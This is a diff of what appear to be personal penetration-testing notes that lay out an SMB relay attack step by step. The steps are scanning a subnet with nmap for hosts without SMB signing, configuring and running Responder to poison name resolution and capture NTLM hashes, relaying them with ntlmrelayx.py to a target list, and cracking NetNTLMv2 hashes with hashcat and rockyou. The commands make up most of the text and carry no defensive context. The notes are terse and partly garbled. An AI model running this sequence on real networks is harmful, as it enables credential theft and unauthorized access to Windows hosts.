@@ -35,6 +35,14 @@ hashcat -m 5600 hash0.txt rockyou.txt --force
 
 SMB RELAY:
 
+where is disabled - nessus - smb signing check github
+
+nmap --script=smb2-security-mode.nse -p445 192.168.0.0/24
+
+gedit targets.txt& IPs
+gedit /etc/responder/Responder.conf&
+
+
 responder config: turn off SMB and HTTP
 /usr/share/responder> gedit Responder.conf
 
@@ -51,7 +59,18 @@ HTTPS = On
 DNS = On
 LDAP = On
 
-/usr/share/responder> python Responder.py -I tun0 -i 192.168.0.27 -rdw -v
+/usr/share/responder> ((python Responder.py -I tun0 -i 192.168.0.27 -rdw -v))
 
-python ntlmrealyx.py -tf targets.txt -smb2support
+responder -I eth0 -rdwv
+
+gedit targets.txt (IPs Targets)
+
+
+relay:
+root: ntlmrelayx.py -tf targets.txt -smb2support
+
+Windows: \\IP Kali
+
+
+
 
